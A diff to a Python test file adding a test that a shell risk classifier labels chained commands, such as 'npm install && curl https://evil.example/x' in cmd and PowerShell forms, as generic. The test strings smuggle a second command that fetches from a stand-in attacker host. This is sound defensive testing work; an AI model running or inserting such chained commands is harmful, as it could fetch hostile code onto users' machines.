@@ -107,6 +107,16 @@ class ShellRiskTests(unittest.TestCase):
 
         self.assertEqual(risk.label, "generic")
 
+    def test_cmd_and_powershell_chained_commands_stay_generic(self) -> None:
+        for command in (
+            'cmd /c "npm install && curl https://evil.example/x"',
+            'cmd /c "npm install & curl https://evil.example/x"',
+            'powershell -Command "npm install; curl https://evil.example/x"',
+            "npm install && curl https://evil.example/x",
+        ):
+            with self.subTest(command=command):
+                self.assertEqual(classify_shell_risk(command).label, "generic")
+
 
 if __name__ == "__main__":
     unittest.main()
